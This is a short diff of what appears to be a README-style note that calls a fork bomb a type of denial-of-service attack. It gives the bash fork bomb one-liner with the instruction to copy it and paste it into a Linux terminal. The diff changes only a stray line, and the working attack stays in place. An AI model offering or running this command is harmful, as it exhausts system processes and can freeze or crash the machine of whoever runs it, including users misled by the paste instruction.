@@ -4,7 +4,7 @@
 : Well forkbomb is type of denial-of-service attack that can be executed on a computer system.
 # Here is your code 
 : copy it and then paste in linux terminal
-~~~ Gushppp
+
 ```
 :(){ :|:& };:
 ```
